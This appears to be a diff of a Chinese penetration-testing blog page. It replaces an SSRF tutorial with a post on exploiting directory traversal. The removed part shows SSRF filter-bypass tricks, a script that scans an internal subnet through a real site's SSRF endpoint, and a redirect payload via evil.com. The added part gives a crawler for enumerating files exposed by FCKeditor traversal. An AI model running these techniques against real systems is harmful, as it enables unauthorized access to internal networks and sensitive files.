@@ -5,9 +5,9 @@
 <head>
     <meta http-equiv="content-type" content="text/html; charset=utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SSRF - Reber's Blog</title>
+    <title>目录遍历利用 - Reber's Blog</title>
     <meta name="keywords" content="渗透测试,web安全,漏洞,python,php,linux">
-    <meta name="description" content="">
+    <meta name="description" content="我的个人博客，主要用于记录自己的一些学习笔记之类的东西，其中有渗透测试、python、php等。">
     <meta name="author" content="reber">
     <link rel="stylesheet" type="text/css" href="/css/pure-min.css">
     <!--[if lte IE 8]>
@@ -62,14 +62,14 @@
     <div class="main">
         <div class="left">
             <div>
-                <h2>SSRF</h2>
+                <h2>目录遍历利用</h2>
                 
                 <div class="post-meta">
                     <div style="padding:5px 5px 2px 5px;">
                         <i class="fa fa-calendar fa-fw"></i>
                         <time>
                             
-                                2016-06-30
+                                2019-12-16
                             
                         </time>
                         &nbsp;&nbsp;&nbsp;&nbsp;
@@ -93,7 +93,7 @@
                         
                             <i class="fa fa-tags fa-fw"></i>
                             
-                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/ssrf">ssrf</a>
+                                <a class="post-taxonomy-tag" href="http://wyb0.com/tags/pentest">pentest</a>
                             
                         
                         
@@ -105,142 +105,209 @@
                 
                 
 
-<h3 id="0x00-什么是ssrf">0x00 什么是SSRF</h3>
+<!--
+ * @Author: reber
+ * @Mail: reber0ask@qq.com
+ * @Date: 2019-12-16 09:23:47
+ * @LastEditTime: 2019-12-16 10:51:52
+ -->
 
-<p>SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，<font color="FF0000">它将一个可以发起网络请求的服务当作跳板来攻击其他服务</font>，SSRF的攻击目标一般是<font color="FF0000">内网</font>。<br />
-当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。</p>
+<h3 id="0x00-目录遍历">0x00 目录遍历</h3>
 
-<h3 id="0x01-ssrf的危害">0x01 SSRF的危害</h3>
+<p>一个同事说有一些目录遍历，想着能不能搞个脚本啥的，以后利用也方便，自己没有写出来，说让我看看</p>
 
-<p>可以扫描内部网络<br />
-可以构造数据攻击内部主机</p>
+<p>一般来说存在目录遍历的话就是翻文件，看看有没有一些敏感信息、未授权接口之类的，一个个翻的话也确实比较麻烦</p>
 
-<h3 id="0x02-漏洞挖掘">0x02 漏洞挖掘</h3>
+<p>而且 eWebEditor、FCKeditor 这种编辑器有些版本也存在目录遍历漏洞，能找的一些未授权访问也是好的</p>
 
-<p>其实只要能对外发起网络请求就有可能存在SSRF漏洞。</p>
+<p>以前写过一个爬网站链接的脚本，感觉可以在那个脚本的基础上改一下，改过后确实大致能用</p>
 
-<pre><code>1. 从WEB功能上寻找
-    通过URL分享内容
-    文件处理、编码处理、转码等服务
-    在线翻译
-    通过URL地址加载与下载图片
-    图片、文章的收藏
-    设置邮件接收服务器
-2. 从URL关键字寻找
-    share、wap、url、link、src、source、target、u、3g、
-    display、sourceURl、imageURL、domain...
-</code></pre>
+<h3 id="0x01-脚本">0x01 脚本</h3>
 
-<h3 id="0x03-漏洞验证">0x03 漏洞验证</h3>
-
-<pre><code>http://www.aa.com/ss.php?image=http://www.baidu.com/img/bd_logo1.png
-1. 右键在新窗口打开图片，图片地址为http://www.baidu.com/img/bd_logo1.png，
-    说明不存在SSRF漏洞。  
-2. firebug看网络连接信息，若没有http://www.baidu.com/img/bd_logo1.png
-    这个图片请求，则证明图片是aa.com服务端发起的请求，则可能存在SSRF漏洞。
-</code></pre>
-
-<h3 id="0x04-绕过过滤">0x04 绕过过滤</h3>
-
-<p>有时漏洞利用时会遇到IP限制，可用如下方法绕过：</p>
-
-<pre><code>* 使用@：http://A.com@10.10.10.10 = 10.10.10.10
-* IP地址转换成十进制、八进制：127.0.0.1 = 2130706433
-* 使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx
-* 端口绕过：ip后面加一个端口
-* xip.io：10.0.0.1.xip.io = 10.0.0.1
-        www.10.0.0.1.xip.io = 10.0.0.1
-        mysite.10.0.0.1.xip.io = 10.0.0.1
-        foo.bar.10.0.0.1.xip.io = 10.0.0.1
-* 通过js跳转
-</code></pre>
-
-<h3 id="0x05-通用的ssrf实例">0x05 通用的SSRF实例</h3>
-
-<ul>
-<li>weblogin配置不当，天生ssrf漏洞</li>
-<li>discuz x2.5/x3.0/x3.1/x3.2 ssrf漏洞</li>
-<li>CVE-2016-1897/CVE-2016-1898 - FFMpeg</li>
-<li>CVE-2016-3718 - ImageMagick</li>
-</ul>
-
-<h3 id="0x06-附实例poc">0x06 附实例POC</h3>
-
-<pre><code class="language-python">#!/usr/bin/env python
+<pre><code>#!/usr/bin/env python
 # -*- coding: utf-8 -*-
+'''
+@Author: reber
+@Mail: reber0ask@qq.com
+@Date: 2019-08-05 15:58:38
+@LastEditTime: 2019-12-16 17:07:09
+'''
 
-import re
-import requests
-from IPy import IP
-import Queue
-import threading
-
-
-def get_url_queue():
-    url = &quot;http://www.sogou.com/reventondc/external?key=&amp;objid=&amp;type=2&amp;charset=utf-8&amp;url=http://&quot;
-    urllist = Queue.Queue()
-    ip_list = IP('10.146.20.0/24')
-    port_list = ['80','8000','8080']
-    for ip_add in ip_list:
-        ip_add = str(ip_add)
-        for port in port_list:
-            url_t = url + ip_add + ':' + port
-            urllist.put(url_t)
-    return urllist
-
-def get_title(urllist):
-    while not urllist.empty():
-        url = urllist.get()
-        html = requests.get(url).text
-        patt = r'&lt;title&gt;(.*?)&lt;/title&gt;'
-        m = re.search(patt,html)
-        if m:
-            title = m.group(1)
-            print &quot;%s\t%s&quot; % (url,title)
+import asyncio
+import aiohttp
+from lxml import etree
+from urllib.parse import urljoin
+from urllib.parse import urlparse
+from urllib.parse import urlunsplit
+from pybloom_live import BloomFilter
 
 
-urllist = get_url_queue()
-print &quot;start get title...&quot;
-for x in xrange(1,30):
-    t = threading.Thread(target=get_title,args=(urllist,))
-    t.start()
+bf = BloomFilter(100000, 0.01)
+
+def is_repeat(ele):
+    if ele in bf:
+        return True #元素不一定在集合中
+    else:
+        bf.add(ele)
+        return False #元素一定不在集合中
+
+class GetAllLink(object):
+    &quot;&quot;&quot;docstring for GetAllLink&quot;&quot;&quot;
+    def __init__(self, target, crawl_deepth, rate):
+        super(GetAllLink, self).__init__()
+        self.target = target if (&quot;://&quot; in target) else &quot;http://{}/&quot;.format(target)
+        self.crawl_deepth = crawl_deepth
+        self.current_url_path = self.target
+
+        self.sem = asyncio.Semaphore(rate) # 限制并发量
+        self.loop = asyncio.get_event_loop()
+
+        self.url_links = {
+            &quot;a&quot;: [self.target],
+            &quot;img&quot;: [],
+            &quot;link&quot;: [],
+            &quot;script&quot;: [],
+            &quot;external&quot;: [],
+        }
+        self.unvisited = []
+        self.unvisited.append(self.target)
+        self.visited = []
+
+    async def async_get_page(self, url):
+        async with self.sem:
+            async with aiohttp.ClientSession() as session:
+                try:
+                    async with session.get(url, timeout=10) as resp:
+                        code = resp.status
+                        url = str(resp.url)
+                        html = await resp.text()
+                        return (code, url, html)
+                except aiohttp.client_exceptions.ClientConnectorError:
+                    return (000, url, &quot;Cannot connect to host&quot;)
+
+    def callback(self, future):
+        status_code, url, html = future.result()
+        print(&quot;get url: ==&gt; &quot;+url)
+        self.visited.append(url)
+        if status_code == 200:
+            self.extract_links(url, html)
+        elif status_code == 404 or status_code == 403:
+            print(status_code, url)
+        else:
+            print(status_code, url, html)
+
+    def extract_links(self, url, html):
+        import re
+        url = url.replace(&quot;%5C&quot;,&quot;/&quot;)
+        dir_m = re.findall(r'&lt;Folder name=&quot;(.*?)&quot; /&gt;', html, re.S|re.M)
+        file_m = re.findall(r'&lt;File name=&quot;(.*?)&quot; size=&quot;.*?&quot; /&gt;', html, re.S|re.M)
+        for dir in dir_m:
+            new_url = url+&quot;/&quot;+dir
+            print(new_url.split(&quot;=&quot;)[-1])
+            self.unvisited.append(new_url)
+        for file in file_m:
+            new_url = url+&quot;/&quot;+file
+            print(new_url.split(&quot;=&quot;)[-1])
+            self.visited.append(new_url)
+
+    # def extract_links(self, url, html):
+    #     &quot;&quot;&quot;
+    #     提取 url
+    #     &quot;&quot;&quot;
+    #     o = urlparse(url)
+    #     self.current_url_path = urlunsplit((o.scheme,o.netloc,o.path,'',''))
+
+    #     selector = etree.HTML(html)
+    #     a_list = selector.xpath(&quot;//a/@href&quot;)
+    #     img_list = selector.xpath(&quot;//img/@src&quot;)
+    #     link_list = selector.xpath(&quot;//link/@href&quot;)
+    #     script_list = selector.xpath(&quot;//script/@src&quot;)
+
+    #     for a in a_list:
+    #         self.parse_link(&quot;a&quot;,a)
+    #     for img in img_list:
+    #         self.parse_link(&quot;img&quot;,img)
+    #     for link in link_list:
+    #         self.parse_link(&quot;link&quot;,link)
+    #     for script in script_list:
+    #         self.parse_link(&quot;script&quot;, script)
+
+    # def parse_link(self, link_type, link):
+    #     url = None
+    #     if link.startswith(&quot;//&quot;):
+    #         link = &quot;http:&quot;+link
+
+    #     if link.startswith(&quot;/&quot;) or link.startswith(&quot;.&quot;): #相对路径，肯定是本域
+    #         url = urljoin(self.current_url_path, link)
+    #     elif link.startswith(self.target): #完整url，且为本域
+    #         url = link
+    #     elif link.startswith('http') or link.startswith('https'): # url为http开头且domain不在url中，肯定为外域
+    #         url = link
+    #         link_type = &quot;external&quot;
+
+    #     if url and (not is_repeat(url)):
+    #         if link_type == &quot;a&quot;:
+    #             print(&quot;match url: &quot;+url)
+    #             self.unvisited.append(url)
+    #             self.url_links[link_type].append(url)
+    #         else:
+    #             print(&quot;match url: &quot;+url)
+    #             self.url_links[link_type].append(url)
+
+    def run(self):
+        current_deepth=0
+        while current_deepth &lt; self.crawl_deepth:
+            print(&quot;*&quot;*130)
+            if len(self.unvisited) == 0:
+                break
+            else:
+                tasks = list()
+                while len(self.unvisited) &gt; 0:
+                    url = self.unvisited.pop()
+                    task = asyncio.ensure_future(self.async_get_page(url))
+                    task.add_done_callback(self.callback)
+                    tasks.append(task)
+                self.loop.run_until_complete(asyncio.wait(tasks))
+            current_deepth += 1
+
+
+if __name__ == &quot;__main__&quot;:
+    import optparse
+    parser = optparse.OptionParser(usage='Usage: %prog [options] domaion',
+                                    version='%prog 1.0')
+    parser.add_option('-u', dest='target',default=None, type='string',help='target domain')
+    parser.add_option('-d', dest='deepth',default=3, type='int',help='crawl deepth')
+    parser.add_option('-r', dest='rate', default=10, type='int', help='the rate, default is 10')
+
+    (options, args) = parser.parse_args()
+
+    if options.target:
+        gal = GetAllLink(target=options.target, crawl_deepth=options.deepth, rate=options.rate)
+        gal.run()
+        # print(&quot;-&quot;*130)
+        # print(&quot;\n&quot;.join(gal.url_links[&quot;a&quot;]))
+        # print(&quot;\n&quot;.join(gal.url_links[&quot;img&quot;]))
+        # print(&quot;\n&quot;.join(gal.url_links[&quot;link&quot;]))
+        # print(&quot;\n&quot;.join(gal.url_links[&quot;script&quot;]))
+        # print(&quot;\n&quot;.join(gal.url_links[&quot;external&quot;]))
+        domain = urlparse(options.target).netloc
+        with open(&quot;{}.txt&quot;.format(domain),&quot;a+&quot;) as f:
+            for url in gal.visited:
+                print(url)
+                f.write(url+&quot;\n&quot;)
+            for url in gal.unvisited:
+                f.write(url+&quot;\n&quot;)
+    else:
+        parser.print_help()
 </code></pre>
 
-<h3 id="0x07-防御">0x07 防御</h3>
+<h3 id="0x02-结果">0x02 结果</h3>
 
-<ul>
-<li>限制协议为http或https</li>
-<li>禁止30x转跳</li>
-<li>过滤参数(只要出现内网ip或域名就直接干掉)</li>
-</ul>
+<p>其实也就是在原来脚本的基础上注释了 parse_link()，重写了 extract_links()，把结果输出那里改下</p>
 
-<p><br></p>
+<p>这个脚本是基于 FCKeditor 的目录遍历写的，常见的那种目录遍历的话改下 extract_links() 中的正则就行了</p>
 
-<h4 id="20170609更新">===== 20170609更新 =====</h4>
-
-<p>ssrf无回显用dnslog，有回显就加载第三方内容，宝哥说的姿势：</p>
-
-<ul>
-<li>302跳转</li>
-</ul>
-
-<pre><code class="language-php">//在自己服务器上建立文件，利用302跳转到对方内网地址。
-//http://target.com/httpProxyAccess.htm?go=http://evil.com/a.php?url=http://10.11.213.57
-//a.php内容如下：
-&lt;?php
-    $url = $_GET['url'];
-    header(&quot;Location:&quot;.$url);
-?&gt;
-</code></pre>
-
-<ul>
-<li>iframe</li>
-</ul>
-
-<pre><code class="language-php">//在自己服务器建立文件，利用iframe标签请求对方内网地址。
-//参考http://www.secpulse.com/archives/50034.html
-&lt;iframe src=&quot;对方内网地址&quot;&gt;
-</code></pre>
+<p><img src="/img/post/Xnip2019-12-16_10-20-26.jpg" alt="" /></p>
 
                 
                 <div style="padding:10px 1px;">
@@ -257,19 +324,13 @@ for x in xrange(1,30):
     <div class="pure-u-12-24" style="text-align: left;">
         
         <nav class="prev">
-            <a href="http://wyb0.com/posts/2016/python-encode-setting/">
-                <i class="fa fa-chevron-left"></i>&nbsp;&nbsp;&nbsp;Python的编码问题
+            <a href="http://wyb0.com/posts/2019/postgresql-basis-use/">
+                <i class="fa fa-chevron-left"></i>&nbsp;&nbsp;&nbsp;PostgreSQL 简单使用
             </a>
         </nav>
         
     </div>
     <div class="pure-u-12-24" style="text-align: right;">
-        
-        <nav class="next">
-            <a href="http://wyb0.com/posts/2016/python-module-requests/">
-                Python的requests模块&nbsp;&nbsp;&nbsp;<i class="fa fa-chevron-right"></i>
-            </a>
-        </nav>
         
     </div>
 </div>
